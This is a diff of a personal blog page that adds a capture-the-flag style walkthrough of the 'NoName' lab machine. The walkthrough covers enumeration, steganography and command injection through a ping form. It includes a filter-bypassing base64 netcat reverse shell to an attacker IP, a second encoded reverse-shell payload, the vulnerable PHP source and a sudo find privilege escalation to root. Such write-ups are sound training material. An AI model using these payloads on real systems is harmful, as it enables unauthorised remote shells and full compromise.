@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Reverse Shell,Steganography,Injection," />
 
 
 
@@ -79,12 +79,19 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Sev1on">
-<meta property="og:url" content="https://sev1on.github.io/categories/Windows-Walkthrough/index.html">
+<meta name="description" content="This target focuses on web enumeration, intuition and creativity to solve the puzzles. Some steganography skills are required.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NoName">
+<meta property="og:url" content="https://sev1on.github.io/undefined/NoName/index.html">
 <meta property="og:site_name" content="Sev1on">
+<meta property="og:description" content="This target focuses on web enumeration, intuition and creativity to solve the puzzles. Some steganography skills are required.">
 <meta property="og:locale">
+<meta property="article:published_time" content="2021-05-17T22:31:09.000Z">
+<meta property="article:modified_time" content="2021-08-01T10:24:30.795Z">
 <meta property="article:author" content=" ">
+<meta property="article:tag" content="Reverse Shell">
+<meta property="article:tag" content="Steganography">
+<meta property="article:tag" content="Injection">
 <meta name="twitter:card" content="summary">
 
 
@@ -115,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://sev1on.github.io/categories/Windows-Walkthrough/"/>
+  <link rel="canonical" href="https://sev1on.github.io/undefined/NoName/"/>
 
 
 
 
 
-  <title>Category: Windows Walkthrough | Sev1on</title>
+  <title>NoName | Sev1on</title>
   
 
 
@@ -140,7 +147,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -278,56 +285,248 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Windows Walkthrough<small>Category</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sev1on.github.io/undefined/NoName/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Sevion3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sev1on">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/undefined/Kevin/" itemprop="url">
-              
-                <span itemprop="name">Kevin</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">NoName</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2021-07-31T03:11:12+00:00"
-              content="2021-07-31" >
-          07-31
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-05-17T22:31:09+00:00">
+                2021-05-17
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-Walkthrough/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux Walkthrough</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  This target focuses on web enumeration, intuition and creativity to solve the puzzles. Some steganography skills are required.
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Exploitation-Guide-for-NoName"><a href="#Exploitation-Guide-for-NoName" class="headerlink" title="Exploitation Guide for NoName"></a><strong>Exploitation Guide for NoName</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h3><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We initiate our enumeration process by running an <code>nmap</code> scan against our target to identify any open ports. After that, we immediately launch another scan adding in the <code>-A</code> argument for further service enumeration of the discovered ports.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.54.15</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 19:25 SAST</span><br><span class="line">Nmap scan report for 192.168.249.15</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p 80 -A 192.168.54.15</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 19:26 SAST</span><br><span class="line">Nmap scan report for 192.168.249.15</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Browsing to the default web page on port 80 (<a target="_blank" rel="noopener" href="http://192.168.54.15/">http://192.168.54.15/</a>), we identify a decoy masquerading as a system command execution utility.</p>
+<p>After brute-forcing the website with <code>GoBuster</code>, we discover additional directories:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ locate common.txt</span><br><span class="line">...</span><br><span class="line">/usr/lib/python3/dist-packages/mercurial/helptext/common.txt</span><br><span class="line">/usr/share/dirb/wordlists/common.txt</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -w /usr/share/dirb/wordlists/common.txt —url http://192.168.249.15</span><br><span class="line">...</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/admin (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Image-Steganography"><a href="#Image-Steganography" class="headerlink" title="Image Steganography"></a><strong>Image Steganography</strong></h3><p>Navigating to that directory (<a target="_blank" rel="noopener" href="http://192.168.120.68/admin">http://192.168.120.68/admin</a>), we are met with <code>HacLabs directory of gallery.</code>, followed by four images: <strong>ctf-01.jpg</strong>, <strong>haclabs.jpeg</strong>, <strong>new.jpg</strong>, and <strong>Short.png</strong>. We will download all the images for further analysis.</p>
+<p>If we look at line 60 in the source code of the default file in the <em>/admin</em> directory, we will find the following commented out text:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!—passphrase:harder—&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We will Install <code>steghide</code> to assist in retrieving any information hidden away in the images.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo apt-get install steghide -y</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now that we have the images and the passphrase <code>harder</code>, we can use <code>steghide</code> to reveal hidden information inside the images. By analysing the image <strong>haclabs.jpeg</strong> and providing the passphrase, we discover a new file <strong>superadmin.php</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ steghide extract -sf haclabs.jpeg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;imp.txt&quot;.</span><br><span class="line">root@kali:~/Documents/VulnHub/noname# cat imp.txt</span><br><span class="line">c3VwZXJhZG1pbi5waHA=</span><br><span class="line">root@kali:~/Documents/VulnHub/noname# cat imp.txt | base64 -d</span><br><span class="line">superadmin.phpkali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Command-Injection-Vulnerability"><a href="#Command-Injection-Vulnerability" class="headerlink" title="Command Injection Vulnerability"></a><strong>Command Injection Vulnerability</strong></h3><p>Navigating to <a target="_blank" rel="noopener" href="http://192.168.54.15/superadmin.php">http://192.168.54.15/superadmin.php</a>, we are met with an “Enter an IP to ping” text box. We can clearly see that we have some command execution on the target after entering the following:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | id</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We observe the desired output:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>However, getting a reverse shell right away does not seem to be working. This is probably caused by a basic input filter setup in the application. We can extract the server-side code into a base64 format and then decode it on our Kali machine. Let’s enter:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat superadmin.php |  base64</span><br></pre></td></tr></table></figure>
+
+<p>We can see that the source code of the page is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   if (isset($_POST[&#x27;submitt&#x27;]))&#123;   	$word=array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;/&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);   	$pinged=$_POST[&#x27;pinger&#x27;];   	$newStr = str_replace($word, &quot;&quot;, $pinged);   	if(strcmp($pinged, $newStr) == 0)		&#123;		    $flag=1;		&#125;       else		&#123;		   $flag=0;		&#125;&#125;if ($flag==1)&#123;$outer=shell_exec(&quot;ping -c 3 $pinged&quot;);echo &quot;&lt;pre&gt;$outer&lt;/pre&gt;&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>We can bypass the filtering put in place by creating a <strong>bash</strong> reverse shell and encoding it in base64. We can use the following shell for this purpose:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -I 2&gt;&amp;1|nc 192.168.49.249 80 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>Let’s save it to a file named <strong>rev.txt</strong>. We need to base64-encode it before pasting into the textbox:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ cat rev.txt| base64cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yNDkgODAgPi90bXAvZgo=</span><br></pre></td></tr></table></figure>
+
+<p>We will set up a netcat listener on our Kali machine on port 80, and then deliver our payload to the vulnerable web application with the following command:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yNDkgODAgPi90bXAvZgo= | base64 -d | bash</span><br></pre></td></tr></table></figure>
+
+<p>Our reverse shell will be available on our netcat listener once the command has been executed on the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -lvp 80listening on [any] 80 ...192.168.249.15: inverse host lookup failed: Unknown hostconnect to [192.168.49.249] from (UNKNOWN) [192.168.249.15] 35286/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@haclabs:/var/www/html$</span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Recovering-Hidden-Credentials"><a href="#Recovering-Hidden-Credentials" class="headerlink" title="Recovering Hidden Credentials"></a><strong>Recovering Hidden Credentials</strong></h3><p>The contents of the file <strong>flag1.txt</strong> in the home directory of <code>yash</code> suggests that there is a hidden file on the system that contains the needed credentials to continue.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@haclabs:/var/www/html$ cd /home/yash &amp;&amp; ls -lacd /home/yash &amp;&amp; ls -latotal 32drwxr-xr-x 5 yash yash 4096 Feb 15 16:28 .drwxr-xr-x 4 root root 4096 Jan 27 20:32 ..-rw------- 1 yash yash    0 Mar 14 00:52 .bash_history-rw-r--r-- 1 yash yash 3771 Jan 27 20:32 .bashrcdrwx------ 2 yash yash 4096 Feb  9 18:06 .cachedrwx------ 3 yash yash 4096 Jan 27 20:33 .gnupgdrwxrwxr-x 3 yash yash 4096 Jan 27 20:35 .local-rw-r--r-- 1 yash yash  807 Jan 27 20:32 .profile-rw-rw-r-- 1 yash yash   77 Jan 30 03:56 flag1.txtwww-data@haclabs:/home/yash$www-data@haclabs:/home/yash$ cat flag1.txtcat flag1.txtDue to some security issues,I have saved haclabs password in a hidden file.</span><br></pre></td></tr></table></figure>
+
+<p>Running the <strong>find</strong> command for all files owned by <code>yash</code> reveals the location of the hidden file to be <strong>/usr/share/hidden/.passwd</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ find / -type f -user yash 2&gt;/dev/nullfind / -type f -user yash 2&gt;/dev/null/home/yash/flag1.txt/home/yash/.bashrc/home/yash/.cache/motd.legal-displayed/home/yash/.profile/home/yash/.bash_history/usr/share/hidden/.passwd</span><br></pre></td></tr></table></figure>
+
+<p>Inside the file, we find the needed credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ cat /usr/share/hidden/.passwdcat /usr/share/hidden/.passwdhaclabs1234</span><br></pre></td></tr></table></figure>
+
+<p>We have the password for the user <code>haclabs</code>. From this point, we can simply <code>su</code> into the account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@haclabs:/home/yash$ su haclabssu haclabsPassword: haclabs1234haclabs@haclabs:/home/yash$</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a><strong>Sudo</strong></h3><p>Once we are authenticated as the user <code>haclabs</code>, we run <code>sudo -l</code> to determine that we can run <strong>find</strong> with elevated privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">haclabs@haclabs:/home/yash$ sudo -lsudo -lMatching Defaults entries for haclabs on haclabs:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser haclabs may run the following commands on haclabs:    (root) NOPASSWD: /usr/bin/find</span><br></pre></td></tr></table></figure>
+
+<p>We can spawn a root shell by running <strong>find</strong> via sudo and utilising its ability to spawn a shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">haclabs@haclabs:/home/yash$ sudo find . -exec /bin/sh \; -quit# ididuid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>Focus：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | ‘<span class="built_in">echo</span> <span class="string">&quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTEwIDc3ODg=&quot;</span> | base64 -d ’</span><br></pre></td></tr></table></figure>
+
+<p>注意echo前后的中文引号（非英文引号）</p>
+<p>base64编码解码在线网站：<a target="_blank" rel="noopener" href="https://www.base64encode.org/">https://www.base64encode.org/</a></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Reverse-Shell/" rel="tag"># Reverse Shell</a>
+          
+            <a href="/tags/Steganography/" rel="tag"># Steganography</a>
+          
+            <a href="/tags/Injection/" rel="tag"># Injection</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/undefined/Debian%E8%AE%BE%E7%BD%AEGRUB%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0%E7%A6%81%E7%94%A8IPV6/" rel="next" title="Debian设置GRUB启动参数禁用IPV6">
+                <i class="fa fa-chevron-left"></i> Debian设置GRUB启动参数禁用IPV6
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/undefined/SunsetMidnight/" rel="prev" title="SunsetMidnight">
+                SunsetMidnight <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
 
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -335,6 +534,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -355,8 +558,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -443,6 +655,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation-Guide-for-NoName"><span class="nav-number">1.</span> <span class="nav-text">Exploitation Guide for NoName</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">1.1.</span> <span class="nav-text">Summary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">1.1.1.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">1.1.2.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Enumeration"><span class="nav-number">1.1.3.</span> <span class="nav-text">Web Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Image-Steganography"><span class="nav-number">1.1.4.</span> <span class="nav-text">Image Steganography</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-number">1.2.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Command-Injection-Vulnerability"><span class="nav-number">1.2.1.</span> <span class="nav-text">Command Injection Vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-Shell"><span class="nav-number">1.2.2.</span> <span class="nav-text">Reverse Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalation"><span class="nav-number">1.3.</span> <span class="nav-text">Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Recovering-Hidden-Credentials"><span class="nav-number">1.3.1.</span> <span class="nav-text">Recovering Hidden Credentials</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sudo"><span class="nav-number">1.3.2.</span> <span class="nav-text">Sudo</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -635,6 +863,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
